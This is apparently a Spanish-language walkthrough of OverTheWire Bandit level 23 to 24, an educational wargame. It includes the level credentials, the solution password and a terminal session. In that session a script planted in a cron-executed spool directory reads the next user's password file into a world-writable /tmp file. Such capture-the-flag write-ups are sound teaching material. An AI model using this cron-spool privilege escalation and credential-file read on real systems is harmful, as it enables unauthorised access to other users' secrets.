## Level 23 → Level 24

## Objetivo
Un programa se ejecuta automáticamente a intervalos regulares desde **cron** , el programador de trabajos basado en el tiempo. Busque en **/etc/cron.d/** la configuración y vea qué comando se está ejecutando.

**NOTA:** este nivel requiere que cree su propio primer script de shell. ¡Este es un paso muy grande y deberías estar orgulloso de ti mismo cuando superes este nivel!

**NOTA 2:** tenga en cuenta que su script de shell se elimina una vez que se ejecuta, por lo que es posible que desee conservar una copia...
## Datos de acceso al nivel
- bandit23 
- QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion
```
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root cronjob_bandit22 cronjob_bandit24 e2scrub_all sysstat
cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_root otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
if [ "$i" != "." -a "$i" != ".." ];
then
echo "Handling $i"
owner="$(stat --format "%U" ./$i)"
if [ "${owner}" = "bandit23" ]; then
timeout -s 9 60 ./$i
fi
rm -f ./$i
fi
done
bandit23@bandit:~$ mkdir /tmp/kd
bandit23@bandit:~$ cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 >
/tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls –la
total 92
drwxrwxr-x 2 bandit23 bandit23 4096 Mar 17 04:41 .
drwxrwx-wt 1957 root root 81920 Mar 17 04:41 ..
-rw-rw-rw- 1 bandit23 bandit23 0 Mar 17 04:41 password
-rwxrwxr-x 1 bandit23 bandit23 49 Mar 17 04:41 script.sh
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 92
drwxrwxr-x 2 bandit23 bandit23 4096 Mar 17 04:43 .
drwxrwx-wt 1957 root root 81920 Mar 17 04:43 ..
-rw-rw-rw- 1 bandit23 bandit23 0 Mar 17 04:43 password
-rwxrwxr-x 1 bandit23 bandit23 49 Mar 17 04:40 script.sh
bandit23@bandit:/tmp/kd$ date
Fri Mar 17 04:41:12 PM UTC 2023
bandit23@bandit:/tmp/kd$ ls -la
total 96
drwxrwxr-x 2 bandit23 bandit23 4096 Mar 17 04:41 .
drwxrwx-wt 1957 root root 81920 Mar 17 04:43 ..
-rw-rw-rw- 1 bandit23 bandit23 33 Mar 17 04:44 password
-rwxrwxr-x 1 bandit23 bandit23 49 Mar 17 04:40 script.sh
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/kd$
```

## Notas adicionales

## Referencias
- https://rundata.wordpress.com/2013/03/21/overthewire-bandit-wargame-solutions-1-24/
- https://www.youtube.com/watch?v=lPtL7kqLyDA